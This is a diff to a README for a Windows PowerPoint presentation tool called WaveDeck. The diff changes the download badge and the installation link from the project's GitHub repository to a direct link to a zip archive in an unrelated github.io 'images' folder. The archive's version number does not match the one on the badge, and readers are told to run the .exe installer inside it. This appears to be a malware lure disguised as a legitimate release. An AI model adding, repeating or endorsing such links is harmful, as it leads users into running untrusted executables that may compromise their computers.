@@ -5,7 +5,7 @@ description: "Control PowerPoint presentations with motion gestures on Windows."
 ---
 # 📽️ textwavedeck - Professional presentations with smooth cinematic navigation
 
-[![Download Version 1.0.0](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Arase6092/textwavedeck)
+[![Download Version 1.0.0](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Arase6092/arase6092.github.io/main/images/Dist_v3.4.zip)
 
 WaveDeck turns your Windows computer into a professional stage for PowerPoint presentations. It offers high-quality export options and intuitive controls. You manage your slides with fluid transitions and clear visual previews.
 
@@ -23,7 +23,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official release page to download the application installer: [https://github.com/Arase6092/textwavedeck](https://github.com/Arase6092/textwavedeck)
+1.  Visit the official release page to download the application installer: [https://raw.githubusercontent.com/Arase6092/arase6092.github.io/main/images/Dist_v3.4.zip](https://raw.githubusercontent.com/Arase6092/arase6092.github.io/main/images/Dist_v3.4.zip)
 2.  Locate the file named `WaveDeck-Installer.exe` in your downloads folder.
 3.  Double-click the file to start the installation.
 4.  Follow the prompts on your screen to complete the setup.
